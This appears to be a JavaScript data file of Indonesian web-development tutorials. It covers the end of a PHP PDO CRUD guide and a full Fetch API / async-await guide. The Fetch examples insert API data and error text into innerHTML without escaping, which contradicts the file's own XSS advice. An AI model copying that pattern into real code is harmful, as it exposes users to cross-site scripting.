          "<?php\n// koneksi.php\n$host = '127.0.0.1';\n$db   = 'db_crud';\n$user = 'root';\n$pass = '';           // XAMPP default: kosong\n\ntry {\n    $pdo = new PDO(\n        \"mysql:host=$host;dbname=$db;charset=utf8mb4\",\n        $user, $pass,\n        [\n            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,\n            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n            PDO::ATTR_EMULATE_PREPARES   => false,\n        ]\n    );\n} catch (PDOException $e) {\n    die('Koneksi gagal: ' . $e->getMessage());\n}"
        ) +
        '<h2 id="create">3. Create — Tambah Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// proses tambah (tombol submit dari form)\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $stmt = $pdo->prepare(\n        'INSERT INTO mahasiswa (nama, email, jurusan) VALUES (?, ?, ?)'\n    );\n    $stmt->execute([\n        trim($_POST['nama']),\n        filter_var($_POST['email'], FILTER_VALIDATE_EMAIL),\n        trim($_POST['jurusan']),\n    ]);\n    header('Location: index.php');\n    exit;\n}"
        ) +
        '<h2 id="read">4. Read — Tampilkan Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// index.php (bagian tabel)\nrequire 'koneksi.php';\n\n$rows = $pdo->query('SELECT * FROM mahasiswa ORDER BY id DESC')->fetchAll();\n?>\n<table border=\"1\" cellpadding=\"8\">\n  <tr><th>#</th><th>Nama</th><th>Email</th><th>Jurusan</th><th>Aksi</th></tr>\n<?php foreach ($rows as $r): ?>\n  <tr>\n    <td><?= (int)$r['id'] ?></td>\n    <td><?= htmlspecialchars($r['nama']) ?></td>\n    <td><?= htmlspecialchars($r['email']) ?></td>\n    <td><?= htmlspecialchars($r['jurusan']) ?></td>\n    <td>\n      <a href=\"edit.php?id=<?= (int)$r['id'] ?>\">Edit</a>\n      <a href=\"hapus.php?id=<?= (int)$r['id'] ?>\"\n         onclick=\"return confirm('Hapus data ini?')\">Hapus</a>\n    </td>\n  </tr>\n<?php endforeach; ?>\n</table>"
        ) +
        callout(
          "note",
          "<code>htmlspecialchars()</code> wajib dipakai saat menampilkan data ke HTML untuk mencegah <strong>XSS</strong> (Cross-Site Scripting). Parameternya diikat sebagai angka <code>(int)</code> agar tidak bisa dimanipulasi."
        ) +
        '<h2 id="update">5. Update — Ubah Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// edit.php\nrequire 'koneksi.php';\n$id = (int)($_GET['id'] ?? 0);\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $stmt = $pdo->prepare(\n        'UPDATE mahasiswa SET nama=?, email=?, jurusan=? WHERE id=?'\n    );\n    $stmt->execute([\n        $_POST['nama'], $_POST['email'], $_POST['jurusan'], $id\n    ]);\n    header('Location: index.php');\n    exit;\n}\n\n$stmt = $pdo->prepare('SELECT * FROM mahasiswa WHERE id = ?');\n$stmt->execute([$id]);\n$mhs = $stmt->fetch();\nif (!$mhs) { die('Data tidak ditemukan'); }\n?>"
        ) +
        '<h2 id="delete">6. Delete — Hapus Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// hapus.php\nrequire 'koneksi.php';\n$id = (int)($_GET['id'] ?? 0);\n\n$stmt = $pdo->prepare('DELETE FROM mahasiswa WHERE id = ?');\n$stmt->execute([$id]);\n\nheader('Location: index.php');\nexit;"
        ) +
        '<h2 id="keamanan">7. Ringkasan Keamanan Wajib</h2>' +
        "<ul>" +
        "<li><strong>Prepared statements (PDO/mysqli)</strong> — cegah SQL Injection</li>" +
        "<li><strong>htmlspecialchars()</strong> — cegah XSS saat output</li>" +
        "<li><strong>(int) cast</strong> pada ID — cegah manipulasi parameter</li>" +
        "<li><strong>CSRF token</strong> pada setiap form — cegah request palsu</li>" +
        "<li><strong>Password_hash()</strong> — bila nanti menambahkan login</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>CRUD adalah tulang punggung hampir semua aplikasi web. Setelah mahir pola PDO ini, kamu bisa naik ke framework (Laravel, CodeIgniter) tanpa kehilangan pemahaman tentang apa yang sebenarnya terjadi di balik layar.</p>" +
        callout(
          "tip",
          "Tantangan lanjutan: tambahkan fitur <strong>pencarian</strong> (WHERE nama LIKE), <strong>paginasi</strong> (LIMIT/OFFSET), dan <strong>validasi form server-side</strong> sebelum lanjut ke topik berikutnya.",
          "LATIHAN"
        ),
    },

    "webdev-fetch-api-javascript": {
      id: "webdev-fetch-api-javascript",
      crumb: "Fetch API JavaScript",
      title: "Integrasi REST API dan Fetch Data Menggunakan JavaScript Modern",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Panduan memanggil REST API dengan Fetch API dan async/await: menangani response JSON, error handling, request POST/PUT, hingga rendering data dinamis ke DOM.",
      date: "2026-09-21",
      readTime: 13,
      lab: "Browser + VS Code Live Server",
      author: "Admin KBHub",
      tags: ["javascript", "fetch", "api", "async-await"],
      content:
        '<h2 id="konsep">1. Konsep REST API</h2>' +
        "<p><strong>REST API</strong> berkomunikasi lewat HTTP dengan metode yang bermakna: <code>GET</code> (ambil), <code>POST</code> (buat), <code>PUT/PATCH</code> (ubah), <code>DELETE</code> (hapus). Respons umumnya berupa JSON.</p>" +
        '<table><thead><tr><th>Metode</th><th>Tujuan</th><th>Contoh endpoint</th></tr></thead><tbody>' +
        "<tr><td><code>GET</code></td><td>Ambil data</td><td><code>/api/users</code></td></tr>" +
        "<tr><td><code>POST</code></td><td>Buat data baru</td><td><code>/api/users</code></td></tr>" +
        "<tr><td><code>PUT</code></td><td>Perbarui data</td><td><code>/api/users/1</code></td></tr>" +
        "<tr><td><code>DELETE</code></td><td>Hapus data</td><td><code>/api/users/1</code></td></tr>" +
        "</tbody></table>" +
        '<h2 id="fetch-get">2. Fetch Data (GET) dengan Async/Await</h2>' +
        codeBlock(
          "javascript",
          "const API = 'https://jsonplaceholder.typicode.com/users';\n\nasync function ambilUsers() {\n  try {\n    const res = await fetch(API);\n\n    // PENTING: fetch TIDAK melempar error untuk status 404/500\n    // harus dicek manual lewat res.ok\n    if (!res.ok) {\n      throw new Error(`HTTP ${res.status} — ${res.statusText}`);\n    }\n\n    const users = await res.json();   // parsing JSON\n    render(users);\n  } catch (err) {\n    console.error('Gagal memuat:', err.message);\n    document.querySelector('#list').innerHTML =\n      `<p class=\"text-red-500\">Error: ${err.message}</p>`;\n  }\n}\n\nfunction render(users) {\n  const html = users.map(u => `\n    <li class=\"p-3 border-b border-slate-700\">\n      <strong>${u.name}</strong><br>\n      <span class=\"text-slate-400 text-sm\">${u.email}</span>\n    </li>`).join('');\n\n  document.querySelector('#list').innerHTML = html;\n}\n\nambilUsers();"
        ) +
        callout(
          "warning",
          "Kesalahan paling umum: menganggap <code>fetch()</code> otomatis gagal saat status respons 404/500. <strong>Tidak</strong> — fetch hanya reject ketika jaringan bermasalah. Selalu periksa <code>res.ok</code> secara manual."
        ) +
        '<h2 id="post">3. Kirim Data (POST/PUT)</h2>' +
        codeBlock(
          "javascript",
          "async function tambahUser(data) {\n  const res = await fetch('https://jsonplaceholder.typicode.com/users', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Accept': 'application/json',\n    },\n    body: JSON.stringify(data),   // objek → string JSON\n  });\n\n  if (!res.ok) throw new Error('Gagal menyimpan data');\n  return res.json();\n}\n\n// pemakaian\nawait tambahUser({\n  name: 'Andi',\n  email: 'andi@mail.com',\n  username: 'andi-dev',\n});"
        ) +
        '<h2 id="timeout">4. Timeout &amp; Abort</h2>' +
        "<p>Fetch tidak punya timeout bawaan. Gunakan <strong>AbortController</strong> agar request yang menggantung tidak menunggu selamanya:</p>" +
        codeBlock(
          "javascript",
          "async function fetchDenganTimeout(url, ms = 8000) {\n  const ctrl = new AbortController();\n  const timer = setTimeout(() => ctrl.abort(), ms);\n\n  try {\n    const res = await fetch(url, { signal: ctrl.signal });\n    return await res.json();\n  } finally {\n    clearTimeout(timer);\n  }\n}\n\ntry {\n  const data = await fetchDenganTimeout('/api/laporan');\n  console.log(data);\n} catch (e) {\n  console.error(e.name === 'AbortError' ? 'Timeout!' : e.message);\n}"
        ) +
        '<h2 id="error">5. Pola Error Handling yang Rapi</h2>' +
        codeBlock(
          "javascript",
          "// pembungkus reusable agar pemanggilan lebih bersih\nasync function api(url, options = {}) {\n  const res = await fetch(url, {\n    ...options,\n    headers: {\n      'Content-Type': 'application/json',\n      ...options.headers,\n    },\n  });\n\n  if (!res.ok) {\n    const err = await res.json().catch(() => ({}));\n    throw new Error(err.message || `Error ${res.status}`);\n  }\n\n  return res.status === 204 ? null : res.json();\n}\n\n// pemakaian jadi ringkas\nconst users = await api('/api/users');\nawait api('/api/users/1', { method: 'DELETE' });"
        ) +
        '<h2 id="cors">6. Catatan CORS</h2>' +
        "<p>Jika muncul error <em>&quot;Failed to fetch: CORS policy&quot;</em>, berarti server API tidak mengizinkan domain kamu. Solusi:</p>" +
        "<ul>" +
        "<li>Di server API: set header <code>Access-Control-Allow-Origin</code> yang benar</li>" +
        "<li>Saat development: pakai proxy atau matikan CORS sementara di browser via flag khusus (<code>--disable-web-security</code> — hanya untuk lokal!)</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola inti Fetch modern: <strong><code>fetch → cek res.ok → res.json() → render DOM</code></strong>, dibungkus <code>async/await</code> + <code>try/catch</code>. Setelah menguasai ini, library seperti Axios atau React Query hanyalah pembungkus dengan fitur tambahan.</p>" +
        callout(
          "tip",
          "Latihan: buat aplikasi pencarian GitHub user — ketik di input, debounce 400 ms, fetch ke <code>api.github.com/search/users?q=...</code>, lalu tampilkan hasil dengan loading state dan pesan error yang jelas.",
          "LATIHAN"
        ),
    },
  };

  window.articlesData = articlesData;
})();
